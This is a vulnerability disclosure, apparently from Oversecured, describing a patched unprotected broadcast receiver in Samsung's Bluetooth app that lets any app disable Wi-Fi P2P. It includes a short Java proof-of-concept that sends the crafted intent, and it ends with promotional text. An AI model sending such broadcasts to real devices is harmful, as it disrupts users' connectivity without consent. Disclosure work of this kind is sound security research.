# Details

<table>
    <tr>
        <td>Name</td>
        <td>Bluetooth</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.android.bluetooth</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.11</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.01.04</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$250</td>
    </tr>
</table>

# Description

Oversecured report:
![](Oversecured_report.png)

The Bluetooth app has been patched by Samsung. In the file `com/samsung/bt/bluetoothcast/mcm/BluetoothAudioCastService.java` they added an unprotected receiver registration which handles the `com.samsung.android.bluetooth.mcf.cast.action.WIFI_SERVICE_DISABLE_RESPONSE` action. If the attacker provides `com.samsung.android.bluetooth.mcf.cast.extra.WIFI_SERVICE_DISABLE_RESPONSE` set to 1 and `com.samsung.android.bluetooth.mcf.cast.extra.WIFI_SERVICE_NAME` set to 4, the app will disable Wi-Fi P2P.

**Proof of Concept**

```java
Intent i = new Intent("com.samsung.android.bluetooth.mcf.cast.action.WIFI_SERVICE_DISABLE_RESPONSE");
i.putExtra("com.samsung.android.bluetooth.mcf.cast.extra.WIFI_SERVICE_DISABLE_RESPONSE", 1);
i.putExtra("com.samsung.android.bluetooth.mcf.cast.extra.WIFI_SERVICE_NAME", 4);
sendBroadcast(i);
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.